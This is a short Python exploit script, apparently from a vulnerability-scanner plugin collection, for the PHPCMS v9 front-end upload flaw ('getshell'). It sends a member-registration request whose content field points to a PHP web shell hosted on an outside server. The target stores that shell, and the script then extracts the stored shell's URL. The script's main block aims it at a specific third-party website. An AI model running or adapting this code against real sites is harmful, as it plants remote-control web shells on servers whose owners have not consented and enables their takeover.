# *_* coding=utf-8 *_*
# Author:Whysec
import requests
import random
import re
class phpcms_uploadfile_1(object):
    def __init__(self,url):
        self.result = {
            'url':url,
            'cms':'phpcms',
            'title':'phpcms v9前台getshell',
            'level':'1',
            'type':'2',
            'author':'Whysec',
            'source':'http://0day5.com/archives/4368/',
            'description':'phpcms v9前台getshell',
            'payload':{
                'get':{'url':'/.svn/entries'},
                'post':'1234'
            },
        }
    def verify(self):
        headers = {
            'User-anget':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
        }
        url  = self.result['url'] + "/index.php?m=member&c=index&a=register&siteid=1"
        try:
            rand = str(random.randrange(1,99999999,8))
            data = {
                'siteid': '1',
                'modelid': '1',
                'username': 'abc%s' % rand,
                'password': '%s' % rand,
                'email': 'a%s@test.com' % rand,
                'info[content]': '<img src=http://files.hackersb.cn/webshell/antSword-shells/php_assert.php#.jpg>',
                'dosubmit': '1',
            }
            res = requests.post(url,data=data)
            shell = re.findall(r"img src=(.+?)&gt;",res.text)[0]
            self.result['payload'] = shell
            print(shell)
            return self.result
        except:
            pass

    def __exploit(self):
        pass

if __name__ == '__main__':
    verify = phpcms_uploadfile_1("http://www.ccic-industrial.com/")
    res = verify.verify()
    print(res)
print(__file__)